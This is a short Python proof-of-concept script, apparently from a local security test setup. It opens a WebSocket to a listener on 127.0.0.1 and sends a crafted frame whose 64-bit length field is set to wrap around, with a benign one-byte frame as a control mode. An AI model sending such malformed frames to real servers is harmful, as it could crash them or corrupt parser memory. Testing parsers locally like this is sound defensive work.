#!/usr/bin/env python3
"""Send a WebSocket upgrade then a masked frame to the plant-started listener.

Only 127.0.0.1:19015 is contacted. Modes: crafted (64-bit wrapped length),
short (one-byte masked payload)."""
import base64
import socket
import struct
import sys
import time

HOST, PORT = "127.0.0.1", 19015
MODE = sys.argv[1] if len(sys.argv) > 1 else "crafted"

upgrade = (
    "GET / HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
    "Sec-WebSocket-Version: 13\r\n"
    "\r\n"
).encode()

if MODE == "crafted":
    # 0x82 FIN+binary, 0xff 64-bit length + mask, wrapped length, key b4.
    frame = b"\x82\xff" + struct.pack(">Q", 0xFFFFFFFFFFFFFFFC) + b"\xb4\xb4\xb4\xb4"
elif MODE == "short":
    # One-byte masked payload 0x41 ^ 0xb4 = 0xf5 on the wire.
    frame = b"\x82\x81" + b"\xb4\xb4\xb4\xb4" + b"\xf5"
else:
    raise SystemExit(f"unknown mode: {MODE}")

s = socket.create_connection((HOST, PORT), timeout=3)
s.sendall(upgrade)
response = b""
while b"\r\n\r\n" not in response:
    chunk = s.recv(4096)
    if not chunk:
        break
    response += chunk
print("UPGRADE_STATUS=" + response.split(b"\r\n", 1)[0].decode("latin1"))
print("FRAME_BYTES=" + frame.hex() + " FRAME_LEN=" + str(len(frame)))
s.sendall(frame)
time.sleep(1.0)
try:
    reply = s.recv(4096)
    print("POST_FRAME_RECV=" + reply.hex())
except OSError as exc:
    print("POST_FRAME_RECV_ERROR=" + str(exc))
s.close()
